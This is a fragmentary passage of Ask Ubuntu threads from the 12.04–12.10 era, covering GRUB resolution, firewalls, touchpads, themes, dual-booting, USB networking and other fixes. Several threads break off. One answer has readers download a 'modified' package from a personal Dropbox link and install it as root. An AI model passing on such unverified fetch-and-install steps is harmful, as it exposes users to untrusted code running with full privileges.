sweetly by LovinBuntu. \nAnother useful source of helpful information regarding all things U/EFI is the wiki article here. Which helps describe and specify Windows 8 demands UEFI >= 2.3.1 (latest is now 2.4) and Secure Boot is available from >= 2.2 UEFI specification.\n(the wiki page linked shares a link for a similar page EUFI page which scares me no end!

Running Ubuntu 12.10 GNOME Remix\nI am trying to get Grub2 to use a resolution of 1600x900...\nI have checked vbeinfo and hwinfo --framebuffer which both provide:\n\nMode 0x037f: 1600x900 (+6400), 24 bits\n\nThis resolution has worked on previous Ubuntu and Fedora installs.\n\n\n\n*\n\n*Here is my /etc/default/grub: http://paste.ubuntu.com/1308444/  Line 25 = GRUB_GFXMODE=\"1600x900\"\n\n*As well as my /boot/grub/grub.cfg: http://paste.ubuntu.com/1308446/  Line 72 = set gfxmode=1600x900\n\n*I have tried using grub-customizer:\n\nWhy is it not taking effect?? I have tried different resolutions...\nBackgrounds and font colours are changeable.\nThank you for your insight.\n\nA: When you set the mode, try to also include the bit depth in /etc/default/grub, e.g.:\nGRUB_GFXMODE=1600x900x24\n\nAlso add this line:\nGRUB_GFXPAYLOAD_LINUX=keep\n\nRun sudo update-grub, reboot and let us know if it worked.\n\nA: I think GRUB_GFXMODE gets ignored (or at least it was at some point ago).

I've added two more:\nif [ \"x${GRUB_GFXMODE}\" = \"x\" ] ; then GRUB_GFXMODE=1680x1050x24 ; fi\nif [ \"x${GRUB_GFXPAYLOAD_LINUX}\" = \"x\" ] ; then GRUB_GFXPAYLOAD_LINUX=1680x1050x24 ; fi\n\nNow find the text set gfxmode=${GRUB_GFXMODE} in that file, and insert the following code as the next line:\nset gfxpayload=${GRUB_GFXPAYLOAD_LINUX}\n\nAgain, I'm not sure if it nesessary for the latest grub2 (I have 1.98)\nNow update grub config file:\nsudo update-grub2\n\nand everything should be working.\n\nA: In my case there was other configuration file besides\n/etc/default/grub, /etc/default/grub.d/kali-themes.cfg (as you imagine it is Kali Linux, debian derivative, just like Ubuntu).\nIt had a line GRUB_GFXMODE=\"auto,1280x720,1280x800\" that has been breaking everything. Now, deleteing it and doing update-grub fixed it on my real system.\nJust note that some resolutions do not work with auto! They are some nonstandard ones, like 1150xsomething (on vmware, for example). You need to explicitly tell grub that in GRUB_GFXMODE.\nAlso note that in vmware that will never work because the GOP UEFI driver in Vmware does not support higher resolutions (see videoinfo command in uefi-grub command line).\nAlso note that only UEFI booting without CSM supports high resolutions in nvidia GPUs, BIOS VESA extensions are not supported, as nvidia still did not write that driver, but with UEFI it is not needed anymore.\nAlso note that even though in grub there can be 60 fps, there is no way to set 120 Hz or 100 Hz (at least IMHO), and that will mean non smooth switch to Linux Kernel screen, that is why you may want to directly boot kernel without grub. Read about EFISTUB kernel mode. It also will permit Secure Boot in many cases of signed kernels that debian supports.\n", "Q: Ubuntu 12.04 LTS server not allowing incoming connections when using wlan0 I have set up my computer with Ubuntu Server temporally for a minecraft server lan party i have port forwarded the correct ports but when trying to connect i get Connection refused: connect or Connection timed out: connect when i try to ping the local ip i get Destination host unreachable. it works fine if i plug in an Ethernet cord but at the party i will not have that option and there for need help allowing connections to come in from wlan0\nany help is greatly appreciated \n\nA: I found it.\nApparently, firestarter is installed on Ubuntu 12.04 either by default or as a dependency or recommendation to something I normally install. It was present on two different 12.04 machines but I don't remember installing it. Also never heard about it anywhere.\nFirestarter only considers one of your network connections your internet gateway, and by default that's the wifi. So it sets up your linux firewall to block all incoming connections for wifi, but not ethernet, because it considers ethernet to be your local network.\nThe tricky part is that ufw and gufw, which seem to have replaced firestarter as Ubuntu's recommended firewall, have their own set of iptables rules, so they don't even notice firestarter is there and can't switch it off.\nTo get rid of the firestarter rules temporarily, launch firestarter and click the stop button.\nTo get rid of firestarter and its rules permanently, do:\nsudo apt-get remove firestarter\n\nYou can now either leave the firewall as it is and possible disable samba when you're on public wifi, or you can set up a couple of rules of your own with ufw or gufw. I just left if off and plan to switch on gufw by hand if I go on public wifi.\n", "Q: Touchpad sensitivity issue even after upgrading to Ubuntu 12.10 Still having this problem on Ubuntu 12.10 Touchpad twitchy on an HP G62 with a SynPS/2 Synaptics TouchPad even after I upgraded to 12.10. \nSame problem here posted 2 days ago Touchpad sensitivity\nI really have no idea what the problem is and why they didn't fix it. Using this OS less and less 'cause of this. Great OS but synaptics su kc s.\n\nA: I am having the same problem and also tried installing the driver in the link mentioned in the previous comment. I was able to get some good results using the xinput utility to modify the touchpad settings. Specifically with the \"Synaptics Noise Cancellation\" option. By default it was set to \"12, 12\". I am currently using a value of \"28, 28\". And the twitchy pointer behaves a lot better. It's not perfect but usable now. Information on the various driver options can be found here:\nhttp://manpages.ubuntu.com/manpages/precise/man4/synaptics.4.html\nI guess you could use the synclient utility as well to do this. FYI the command I used to modify my settings: \nxinput set-prop 'AlpsPS/2 ALPS DualPoint TouchPad' 'Synaptics Noise Cancellation' 28 28\n\n\nA: Check this link and install your version (32bit or 64 bit) Synaptic Touchpad driver.

Im running Ubuntu 12.10 (Gnome 3). The theme in question is called \"notxp theme\". I don't have sudo privilege on my machine. Is there a way to install the theme despite that fact? \n\nA: To install themes system-wide, you would place them in /usr/share/themes, and icon themes would go in /usr/share/icons.  But since you don't have root access, you can't write to those directories.\nHowever, you can write files to your home directory.  GTK themes can also be placed in ~/.themes (and icons go in ~/.icons).  For example, if your username is \"peter\" you would place files in /home/peter/.themes.\nThese folders may not exist, and even if they do, you almost certainly won't be able to see them by default.  Open your home folder and press [Ctrl]+[H] to display dot files - files and folders which start with a dot - these are hidden files under Linux.  Now you should see several dot files, including stuff like .cache and .bash_logout.  Don't remove these; they're there (and hidden!) for a reason.  Instead, just right-click and Create New Folder and call it .themes.\nSince you didn't specify the particular theme you're working with, I can't guide you on the exact structure they should be copied into the folder with.  Feel free to edit your post, or look around in /usr/share/themes and mimic the structure with your own .themes directory.\nGood luck!\n\nA: Install Ubuntu Tweak.\nExplore it. Now You can install any theme easily.\n", "Q: \"No such file or directory\" error when downloading with 'youtube-dl' Every time I try to download YouTube videos using youtube-dl it gives me this:\nERROR: unable to open for writing: [Errno 2] No such file or directory:<br> 'Filename.mp4.part'\n\nHow can I fix this? Any ideas?\n\nA: The version of youtube-dl in the 12.04 repositories is out of date, update it with the following command:\nsudo youtube-dl --update\n\nIt should work after that.\nIf you don't have root privileges, set an output file as a workaround:\nyoutube-dl -o ~/Videos http://www.youtube.com/watch?v=P0YiWsAM0O8\n\n\nA: I was told that youtube-dl no longer works well and the instead you need to download yt-dlp.

I was running Windows7 on my SSD but when the drive crashed, I decided to use that as an excuse to make the switch to Ubuntu.  I've been experimenting with it on my old laptop until I got my SSD replaced under warranty.\nNow I have my SSD back and want to install Ubuntu on my desktop machine.  I used UNetbootin to make a bootable flash drive.  I then I went into my BIOS and made sure USB loaded before the hard drive.

I also tried to changed the boot sequence on the BIOS to boot from CD/DVD, but got the same.\nI also updated the BIOS to the latest thinking it might be a BIOS issue but got the same.\nMachine comes up to grub rescue prompt.\n\nA: Likely what has happened is that GRUB is trying to find the formatted partition, but cannot. When this happens (I have personally experienced this) GRUB goes into rescue mode.\nIf it is possible to boot from a \"Live CD\" then you should boot so (into Ubuntu) and follow the following tutorial: https://help.ubuntu.com/community/RecoveringUbuntuAfterInstallingWindows\nYes, it does say it is for after installing Windows, but it serves this purpose perfectly as well.\n", "Q: Display cuts off launcher, everything's blurry, Hulu choppy, system slower than Vista Just installed 12.10 64bit.

In Ubuntu 12.10, by default, the minimize speed had been kept considerably slow in order to let users know where the window has minimized to...\nbut all of a sudden i noticed that now the speed is as normal as earlier versions! has there been an update that again increased this speed?\n\nA: The animation doesn't actually change according to the minimize-speed-threshold. Even when you change its value from 100 to 0, the animation is still normal like what you encountered, @Nirmik. What I observe though is that if the minimize-speed-threshold is set to 100 (which is the default), and the minimize-count is set to 0 (also the default), the animation is slow just like when we first run 12.10 after upgrading/installing it.\nNow, the animation will actually get faster every time you minimize a window, since the minimize-count will increase, and the larger it is the faster the animation. The increase in value of minimize-count will stop up to the value of the minimize-speed-threshold.\nIf you click on the minimize-count, you will see a description that says:\nThis is used to adjust the animation speed by making it progressively faster the more it is used.\nFor Slow Animation, I suggest to set up the following:\nminimize-count = 0\nminimize-fast-duration = 1000\nminimize-slow-duration = 1000\nminimize-speed-threshold = 0\n\nFor Faster Animation, I suggest to lower down the value of minimize-fast-duration and the minimize-slow-duration.\n\nA: Yes. According to OMG! Ubuntu!, the minimize animation has been made slower.  They offer a solution as to how to restore old behavior, too:\n\nThe tool we need to use to ‘edit’ the speed is called ‘dconf-editor‘\n  and can be be installed as part of the dconf-tools package.\nWhen installed launch it from the Dash by searching “dconf”\nWhen the Dconf-window opens expand the following sections of the\n  sidebar:\ncom > canonical\nthen click on (but don’t expand) the ‘unity’ entry.\nSelect the following line in the main section of the window:\nminimize-speed-threshold\nDouble-click on the value field (the number) to edit it.\nChange the value from ’100′ to ’0′.\nChanges take effect immediately.\n\nI don't know why the animations seem to be back to normal... Maybe the animations reset themselves after the user has learned where apps go?

I want to install Ubuntu 12.04 along with Windows (keeping both XP and 7) in drive G: without losing any data stored in the computer. I have a hard disk of 500 GB size with C: (14.8 GB left), D:, E:, F:, and G: (15.7 GB left). I tried to  install Ubuntu 12.04 from DVD  and getting stuck at the time of selecting partitions.\nHow do I select the device for boot loader installation? Will the installation of Ubuntu into G: drive affects the data stored in the hard disk or in G: drive especially? After installing Ubuntu can I use Windows XP and Windows 7? This is my first attempt to use Ubuntu. Can any body help me please?\n\nA: Kevin provides a good explanation of the different options. For your scenario I would make the following suggestion:\nThis isn't always required for installing Ubuntu but because you have a busy setup going on, we wanna fine tune our partitions before starting the setup. Just so we can be sure of what's gonna happen with our data and drives and partitions etc.\nBoot your Live USB/CD into \"Try Ubuntu\" mode:\n\n\n*\n\n*Open a program called GParted\n\n*Select your G: Drive in the top right corner, in this case it will be named according to Linux methodology. Something like /dev/sde\n\n*Resize until you have the 15GB free space Unallocated\n\n*Create a 2GB partition as Swap. Learn more here\n\n*Create a partition in the remaining space as ext4\n\n*Remember to Apply the changes!\nDuring the Installation process (called Ubiquity), at the partitioning step:\n\n\n*\n\n*Select Something Else and click next.\n\n*Then double-click the prepared ext4 partition on your intended drive for mounting \"/\". We call this the root structure, the entire file system falls under this. Just like a C: drive in Windows. You can tick the format box if you want even though we just did it.\n\n*The swap partition should automatically be detected, you can double click to check if it's \"used as swap area\".\n\n*The bootloader can also go on the 'G: drive' so we don't have to bugger up the windows bootloaders. Underneath the partitions, in the dropdown, select /dev/sde or whatever this one may be.\n\n*Continue installation.\n\n*IMPORTANT: When restarting, open your BIOS and select your G: drive as the primary boot drive so that it loads the linux bootloader (Called GRUB) before the Windows ones. Grub allows you to select which operating system you want to boot (Dual/Triple boot) and will use Ubuntu as default, you can always change this using grub-customizer\nNow we should have installed Ubuntu alongside the rest without messing with the other drives or their operating systems.\nLet us know if this worked for you! Good Luck!\n\nA: You can install Ubuntu alongside Windows XP and Windows 7 just fine. Assuming you're trying to go the easiest route, boot from your Ubuntu LIVE CD/USB and select \"Install Ubuntu\".\nIn the very early steps it will ask you what you want to do:\n\n\n*\n\n*Install Ubuntu Alongside [existing Operating System/s]. This will replace Windows MBR bootloader with GRUB/GRUB2 bootloader.\n\n*Replace [existing Operating System/s] with Ubuntu (this will format your entire drive and install Ubuntu). Like above, this will include the GRUB/GRUB2 bootloader.\n\n*Something Else (this is for if you have created a partition explicitly for Ubuntu with the appropriate file format [ext4] and want to install Ubuntu here). This is a bit trickier though because the installer will expect the drive to be bootable.\nYou'll be presented with a menu [GRUB/GRUB2] during the boot process (as long as there is more than one Operating System present) that will allow you to choose which operating system you want to start up from. \nHope this helps with your question. \n", "Q: Installed Ubuntu over windows I need to get those windows files.

Something is happening during login using lightdm that overrides the contents of that file.\nIf I login and do a xdg-user-dirs-update --force then the contents of the file are OK. After I logout, the file is still OK. It's when I login again using lightdm that something goes wrong.\nIt's quite annoying.\n\nA: There exists an autostart script\n/etc/xdg/autostart/user-dirs-update-gtk.desktop\n\nWhich calls the program xdg-user-dirs-gtk-update, which appears to have no man page or --help explanation, but I am guessing might be the cause.\nYou can either delete this script (which appears to belong to the package xdg-user-dirs-gtk, and may be recreated if it is updated), or add a line Hidden=true to the autostart file, which should prevent it running (and you should be asked if you want to keep your modified copy during any future updates).\n\nA: Googling your problem led me to xdg-user-dirs, which may be installed from the Ubuntu Software Center. It claims the following feature:\n\nThis program reads a configuration file, and a set of default\n  directories. It then creates localized versions of these directories\n  in the users home directory and sets up a config file in\n  $(XDG_CONFIG_HOME)/user-dirs.dirs (XDG_CONFIG_HOME defaults to\n  ~/.config) that applications can read to find these directories.\n\nThe full documentation can be found here.\n\nA: I suggest to check the following points:\n\n\n*\n\n*Try to check if XDG_CONFIG_HOME is set to a different location as '~/.config`.\n\n*\n\n*on shell level\n\n*via grep XDG_CONFIG_HOME /etc/*profile /etc/*rc ~/.*rc ~/.*profile /etc/X11/Xsession /etc/X11/Xsession.d/*\nAs as workaround use symbolic links between the standard and your custom directory names.\ne.g.\n cd ${HOME}\n function link() {\n local dir=$1\n shift 1\n [ -e ${dir} ] || mkdir -p ${dir}\n for name in $*\n do\n if [ -L ${name} ]\n then\n if [ \"$(readlink ${name})\" = \"${dir}\" ]\n then\n [ -e  \"${dir}\" ] || mkdir -p \"${dir}\"\n echo \"${name} allready converted to ${dir}\"\n else\n echo \"${name} (link) converted to ${dir}\"\n [ -e  \"${dir}\" ] || mkdir -p \"${dir}\"\n mv -av ${name}/* ${dir}/ 2>/dev/null    || true # can be emtpy\n mv -av ${name}/.??* ${dir}/ 2>/dev/null || true # can be emtpy\n rm -f ${name}\n ln -svf ${dir} ${name}\n fi\n else\n if [ -d ${name} ]\n then\n mv -av ${name}/* ${dir}/ 2>/dev/null    || true # can be emtpy\n mv -av ${name}/.??* ${dir}/ 2>/dev/null || true # can be emtpy\n rmdir ${name}\n ln -sv ${dir} ${name};\n echo \"${name} (dir) converted to ${dir}\"\n else\n ln -sv ${dir} ${name};\n echo \"${name} linked to ${dir}\"\n fi\n fi\n done\n\n }\n\n\n #     real                DE          EN\n link  ~/data/templates    Vorlagen    Templates\n link  ~/data/public       Öffentlich  Public\n link  ~/data/documents    Dokumente   Documents\n link  ~/data/music        Musik       Music\n link  ~/data/photo        Bilder      Pictures\n link  ~/data/video        Videos\n link  ~/data/privat       Privat\n\n\nA: The entries would get reset if the custom dirs do not exist when the update runs. Is it possible that your home dir is not mounted until late in the login process? Maybe you can set the defaults in /etc/xdg/user-dirs.defaults so that it gets rewritten to the same paths anyway?\n\nA: After making the changes and saving the file but before you log back in, execute\necho \"enabled=false\" > ~/.config/user-dirs.conf\nThis creates user-dirs.conf that should prevent any further reset.\n", "Q: Upgrading Ubuntu + KDE desktop from 12.04 to 12.10 I installed Ubuntu (not Kubuntu) 12.04 LTS, and afterwards switched desktop from Unity to KDE. I have two related questions:\n\n\n*\n\n*If I upgrade to 12.10 using the updater, would it delete the KDE?\n\n*And if I install it using the KDE updater (from the pop-up\nannouncing Kubuntu 12.10 is available), would it install Kubuntu and not Ubuntu?\nHow should I proceed without messing up my system?\n\nA: I previously switched a GNOME Ubuntu Maverick system to KDE and then upgraded it through Precise using the upgrade manager, without significant issues.\n\n\n*\n\n*The upgrade manager will not remove KDE. It normally preserves the packages and settings you have before the upgrade. It only removes obsolete packages that have been removed from the repositories; since KDE packages are still in Quantal this isn't an issue.\n\n*I believe the Kubuntu updater and the regular Ubuntu (GTK-based) updater are both interfaces to the same program. Running either of them should have the same effect. Kubuntu is pretty much the same as Ubuntu, except with different packages pre-installed and some different global settings (like the choice of display manager and startup splash screen), so it's moot whether the upgrade results in Ubuntu vs. Kubuntu. It will normally keep the settings you previously had.\nOf course, it's recommended to back up your data before upgrading, regardless of which you run. There are several ways to make an image backup. One way is to run a live CD and use dd: sudo dd bs=1M if=/dev/sdX | lzop > /media/your_backup_drive/backup.dd.lzo, where sdX stands for your hard disk (e.g. sda). There's also Partimage.

Previously i used network protocol (UDP) to transfer data between linux and windows. But now i need to use USB cable to transfer data, is this possible ? If possible which cable we need to Use ? Is there any libraries for USB data transfer or samples ?\n\nA: All of the \"Easy Transfer\" type USB data transfer cables have their own software that is required for use, either embedded in the devices or coming separately on disk.  Examples of these devices include the \"Easy Transfer Cable\" (Software separate) and a heap of Chinese made devices similar to this one and the Amkette device you have which have the software embedded in the device.\nI suspect the embedded software is in the form of an autorun that any Windows machine will start up and run to connect to the computer at the other end, which is also running the same software.  Cables sold with the claim that there is \"no need to install any software or drivers\" simply mean that this is embedded and needs no difficult user intervention to connect two Windows computers.\nAlternate methods ranging from a simple ethernet cat 5 crossover cable, large storage USB hard drives, Bluetooth, and  of course fully networked groups of machines connected via a router are all so readily available that there just doesn't seem to be a lot of interest in this technology however further research (ie Google) yields the following information:\nThe setup appears to be what is called \"USBnet\", which connects two computers together as though connected by ethernet.  The only advantage For Ubuntu users that I can see here is if you have a computer with a broken RJ45 ethernet port or card, or if you have a device that doesn't have one but does have a USB port you can use.\nDevices that might be compatible:\n\nAnd this would include devices that use the same chip as those listed.  I have no idea if the device you have is compatible.  This compatibility list is taken directly from linux-usb.org - have a look at this page for more information and instructions.\nFurther to this, here's some instructions on how this was done on Intrepid Ibis.  To quote from message 2:\n#On my primary machine with Intrepid, I configured USB0 using\nifconfig usb0 192.168.1.1\n\n#On the other machine also with Intrepid, I configured usb0 using\nifconfig usb0 192.168.1.2\n\nThen in Network Manager:\n\nSelect edit connections > Auto usb0 and set a manual IP on both computers, using the same IP as default gateway as well.\n\nIt then goes on to give the following instructions for transfer:\nTransferring files\n\n\n*\n\n*Ensure that the Firewall is switched off and you can ping each other\n\n*If you can ping, setup an ftp server wu-ftp daemon on any one or\nboth the machines.\n\n*Install Filezilla FTP client on both computers\n\n*Thats it !! (Really)\n\n*start wu-ftp daemon using \"sudo wu-ftp\" on one machine\n\n*use filezilla on the other machine to quickconnect. Use the User ID and password of the host machine you are connecting to.\n\n*browse & transfer files\n\n\nIt also gives the warning that the file transfer speed was pretty slow.\nWarning to others\nDon't be tempted after reading this to plug a normal male-male USB cable into two computers to try it.  Such a cable would attach each TX and RX pin in the computers in the wrong order (so it wouldn't work anyway) and more importantly will tie the +5 and grounds of the power supplies together.  This can potentially short the two power supplies in a way that can damage them or your computer, and cause other problems up to and including having them burst into flames and burn your house down.  (OK, I'm being dramatic here, but it's a really BAD idea to do this)\n\nA: You might want to have a look a USBnet.\n\nUSBnet allows you to create an IP network using a USB cable.

The graphics seems to work fine (presumably the HD4000 integrated graphics are doing their thing correctly).\nThe problem I'm having is that on first boot, audio works OK over HDMI.  If I turn the TV off but leave the PC on, audio no longer is available over HDMI.  The graphics continue to work though.\nIf I go to Sound Settings, HDMI doesn't even show up as an available audio output (like it would on first boot).\nI've tried killing and restarting pulseaudio but that doesn't work.  Rebooting solves the issue but since the PC is a HTPC I can't keep rebooting it every time the TV is turned off!\nIs there a way to fix this?

I can configured some predefined jobs here. in my case i am trying to run email reminders (ever min/hour/day/month). For this scheduler to be effective, i read some where i need to setup CRON job. So I did some research & finally put following lines in CRONTAB for the root user, as per instructions given in sugarCRM.\n* * * * * cd /var/www/crm; php -f cron.php > /dev/null 2>&1\nWell I am creating contracts in my sugarCRM (AOS module) & I want email reminders to be sent for these contracts to the concern person.

I've searched a lot (including SugarCRM forum), but no luck.\n\n\nA: The line in the crontab just executes the command cd /var/www/crm; php -f cron.php > /dev/null 2>&1. What this command actually does is that, it changes the current working directory to /var/www/crm and tries to execute the cron.php file there using the php interpreter. The output and errors are redirected to /dev/null, ie, they're discarded.\nIf you want the emails to be sent, you have to check if the cron.php is actually having code to send emails and whether that code is getting executed.\n\nA: I have just landed here because I have the same problem. \nAnd it's a misunderstanding: You DON'T have to execute \n*    *    *    *    *  cd /var/www/html/SuiteCRM-7.6.4; php -f cron.php > /dev/null 2>&1 \nYou HAVE to add this line to the crontab file \nExecute: sudo crontab -e\nChoose your favorite editor, and add the line at the end (the 5 stars * are required)\nSave\n", "Q: Windows vista shows ISO file as ZIP! When I download the ISO file, my system shows the file as a zip file and not as an ISO. I have tried to burn the file as an image to a DVD but my laptop will not bootup from the CD. \nSetting in the BIOS are ok. So I guess the problem is with the ISO file or the way I burned the CD.\nI have follwed the instructions on the site for downloading and burning an ISO image to CD. And I guess that my problem is with the file association in windows Vista.\nAny ideas and suggestions are welcome\nThanks\n\nA: One thing you're definitely going to want to make sure of is that the .iso image you are burning is bootable. What program are you using to burn?\nAs far as your OS showing a .iso file as a .zip, that's in the settings of your archive manager. For instance, I use WinRAR which has the capability of recognizing a .iso file as an archive. Normally this setting is chosen during the Installation Setup of the archive manager. Depending on which one you're using though, it may have been automatically configured. Refer to your utility's help files for configuring recognized file extensions. \n\nA: Open Winzip. Go to Option menu > Settings. Choose last Tab integration. Uncheck iso. Close all.\nYou will able to open .iso file with burning tool rather than winzip. \n\nA: You can try to download another program to burn images, and it will take over the file association and provide many great features. For example, ImgBurn will take over the file association, and you can also run the program, pick to burn to a disk, and then browse for the image. IMGburn also provides many useful features you may enjoy, especially on professional equipment.\n\nNote: The author of this post has no connection to ImgBurn.

I was following the Ubuntu guide to create a bootable usb stick with pendrivelinux, however in the last step it shows me that it wants to do more than just copying the .iso file to the USB drive:\n\nMy question: can I safely proceed without wiping the current OS off my phone (Windows Mobile 6.1) and use it to install Ubuntu?\n\nA: No you cannot safely proceed. While HTC phones usually only mount the SD card, rather than their own storage, you will definitely format whatever storage device you currently have mounted. That means, even if you don't remove the OS itself, you will lose data - and most likely data you wouldn't want to lose.\nI recommend getting an actual USB drive (4GB stick minimum), which should be available at really low pricing nowadays.\n\nA: I don't think so.\nYou need to have a FAT32 partition to make a bootable USB Stick, so unless you can find a way to make a FAT32 partition on your phone, I think you're out of luck.\n\nA: if your phone is rooted and you have enough storage you may this: https://play.google.com/store/apps/details?id=com.softwarebakery.drivedroid&hl=pl&gl=US but it will make PHONE, not sd card as bootable device. if your not rooted/not have enough storage - you are out of luck, then sorry.\n", "Q: How to create dm-crypt device in LXC?

This can be very annoying when watching a move or flash video and your display keeps going dark. While Ubuntu has built-in setting that you can use to disable the screensaver, some users are saying the it doesn’t work after applying the settings.\nThis brief tutorial is going to show you a little tool that will help you temporarily disable Ubuntu from going to sleep while inactive for some time. It is called Caffeine. After installing, you have it automatically started everytime you login to Ubuntu or choose when to turn it on. Before watching a movie in Ubuntu, launch Caffeine and configure it to temporarily disable Ubuntu sleep mode while watching the move.\nIt can also be configured to automatically kick in when watching online flash movies as well.\nSo, if everything else fails and Ubuntu is annoying the hell out of you, install Caffeine and give it a try.\nTo get started, press Ctrl – Alt – T  on your keyboard to open the terminal. When it opens, run the commands below to add its PPA.\nsudo add-apt-repository ppa:caffeine-developers/ppa\n\ncaffeine_ubuntu12_install\n\nNext, run the commands below to update your system as well as install Caffeine.\nsudo apt-get update && sudo apt-get install caffeine\n\ncaffeine_ubuntu12_install_1\n\nAfter installing Caffeine, go to Dash and launch Caffeine’s preferences. Choose the preferences of your choice and close out.\ncaffeine_ubuntu12_install_2\n\nBefore watching a move, select Caffeine from the tray menu and select ‘Disable Screensaver’\ncaffeine_ubuntu12_install_3\n\nThat’s it!

The only thing wrong that I have noticed is that I don't get the plymouth Ubuntu logo screen when booting.\nIf that is the only trade-off I am happy to make the edit permanant.\n\nA: Many open source drivers have removed support for non-kernel mode setting, so in those cases when you use nomodeset you will end up falling back to the very basic VESA un-accelerated driver.  This is very much a performance and feature hit.  \nnomodeset should not have any effect on the proprietary (fglrx/nvidia) drivers.  They don't have this kind of kernel mode setting.\nRemoving \"splash\" is what got rid of the Plymouth boot*splash*.\nRadeon just finished removing support for \"User Mode Setting\" (what nomodeset forces the computer to use) relatively recently, but with Intel graphics it has been the case for a while. \nhttp://lists.x.org/archives/xorg-announce/2012-November/002093.html\n\nA: The answer can be found here : http://ubuntuforums.org/showthread.php?t=1613132\n\nnomodeset\nThe newest kernels have moved the video mode setting into\nthe kernel.

This makes it possible to\nhave high resolution nice looking splash (boot) screens and flicker\nfree transitions from boot splash to login screen. Unfortunately, on\nsome cards this doesnt work properly and you end up with a black\nscreen. Adding the nomodeset parameter instructs the kernel to not\nload video drivers and use BIOS modes instead until X is loaded.\n\n", "Q: How to replace tray icons for applications in cinnamon I have on my cinnamon panel some tray icons (skype, pidgin, dropbox) that appear next to others coming from cinnamon but that do not fit the general appearance.\n\nI'd like to replace them with my own icons so that they have similar design to those remaining.\nWhere should I look for icons for pidgin, skype and dropbox?\n\nA: The Skype icon can be replaced by installing a modified version of sni-qt which points the location of the tray icons as /usr/share/pixmaps/skype.\nTo do this, enter the following commands in a terminal -\nwget https://www.dropbox.com/s/x91gec5q0uz3hnx/sni-qt_0.2.6-0ubuntu1_i386-modified.deb?dl=0 -O sni-qt_0.2.6-0ubuntu1_i386-modified.deb\nsudo dpkg -i sni-qt_0.2.6-0ubuntu1_i386-modified.deb\nThe above two commands will download and install the modified version of sni-qt\nNow, we will download and extract the new icon set, which is based on the Faenza Dark theme -\nwget https://www.dropbox.com/s/wimn53noljv0vbi/skype_systemtray_custom_icons.zip?dl=0 -O skype_systemtray_custom_icons.zip\nunzip skype_systemtray_custom_icons.zip\nThe final step is to create a directory /usr/share/pixmaps/skype and copy the icons to it.\nsudo mkdir /usr/share/pixmaps/skype\nsudo cp skype/* /usr/share/pixmaps/skype\nsudo chmod +r /usr/share/pixmaps/skype/*\nThe result - \nBefore - \nAfter - \nTo restore the original configuration - \nsudo apt-get purge sni-qt\nsudo rm -r /usr/share/pixmaps/skype\nsudo apt-get install sni-qt\nCredits to this post and this website.\n\nA: Where to search for icons\nYou can look for icons at http://www.iconfinder.com:\n\n*\n\n*for Pidgin: http://www.iconfinder.com/search/?q=pidgin\n\n*for Skype: http://www.iconfinder.com/search/?q=skype\n\n*for Dropbox: http://www.iconfinder.com/search/?q=dropbox\nAdd an application to cinnamon panel\nNext I will explain how to add Pidgin to the cinnamon panel bar and how to change its icon.\nLet say that your cinnamon panel bar looks something like in the following image in this moment:\n\nTo add Pidgin in the panel par, go to Menu and search for \"Pidgin\".

I am looking at using a version control system to ensure that I can go back in time to a particular version for all documents in ~, if I have to.\nWhat is the best suited tool for this given that:\n\n\n*\n\n*I am without much experience in version control systems\n\n*Several files will be plain text files but there will be some Libre-Office files also\n\n\nThe tool should:\n\n\n*\n\n*Be easy to set-up, run and maintain\n\n*Have easy to understand configuration options (what directories to track, for how long, how frequently the changes should be captured, etc.)\n\n*Ideally have a GUI front also\n\n*Be able to recover deleted files\n\n\nWhat is the best/ most widely used tool that will be suitable for me?\n\nA: I have used CVS, Subversion, git, and a few commercial packages.  I just migrated my personal VCS from CVS to git (I thought it was going to be more difficult than what it actually was, I should have done it long ago).\nI would recommend git. Based upon what you are looking for.\n\nI am a noob without much experience in version control systems\n\ngit may have a longer learning curve, especially if you have experience with a previous VCS. Without having been exposed to a previous VCS, your learning curve maybe be shorter.  \nThe best way to learn git is download the book Pro Git by Scott Chacon (for free), create a test repository (mkdir <project name>; cd <project name>; git init), and hack away at it.  There is really is no effort to create a repository and don't worry about screwing something up in a test repository, as each repository is independent. A repository can be easily removed (cd <project name>; rm -rf .git).\n\nSeveral files will be plain text files but there will be some Libre-Office files\n\nThere is no differentiation with git on file types (ASCII vs binary), however ASCII files are optimal for seeing diffs and merging conflicts.\n\nBe easy to set-up, run and maintain\n\ngit can be configured in a number of ways, it all depends upon what your needs are.  For starters, a one many show, all you have to do is install git (sudo apt-get install --install-recommends git-core) and create a repository (shown above). If you work across a number of machines, you can set up git over ssh (it is in the book). Even better, as your needs expand you don't loose what you have done already.\n\nHave easy to understand configuration options (what directories to track, for how long, how frequently the changes should be captured, etc.)\n\nYou can have one big repository or break them down to individual projects or down to single files.  Again create a git repository and play around with it, see what works and does not.  \n\nIdeally have a GUI front also\n\nThere are many git guis that specialize in many different tasks.  However learning git from the command line is highly recommended.  To get started you only need to learn a few commands (git init, git status git diff, git add, git rm, git commit, git push, git pull).  Also the command line helps you with tasks you need to do.  For example: git status\n# On branch master\n# Your branch is ahead of 'origin/master' by 2 commits.\n#\n# Changes not staged for commit:\n#   (use \"git add <file>...\" to update what will be committed)\n#   (use \"git checkout -- <file>...\" to discard changes in working directory)\n#\n#   modified:   systems/ion/setup.txt\n#   modified:   systems/dogstar/teardown.txt\n#   modified:   applications/help.html\n#   modified:   applications/readme.txt\n#\n# Untracked files:\n#   (use \"git add <file>...\" to include in what will be committed)\n#\n#   applications/faq.html\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\n\nIf you are more comfortable with a GUI, SmartGit is newbie friendly.\n\nBe able to recover deleted files\n\nYes, git can recover any version of any file as long as it has been committed. \n\nWhat is the best/ most widely used tool that will be suitable for me?\n\ngit is widely used. As far as the best goes, it is among the best, if not the best.  But being the best, is more of a personal opinion and is also based upon the situation.  \n\nA: The way it sounds, I think using a version control like git, Mercurial hg, bzr or svn is not a perfect fit for your needs, since they are primarily targeted for source files, not binary data. Thus, I want to add some additional possibilities here.\nI think a nice solution would be a cloud based backup service.

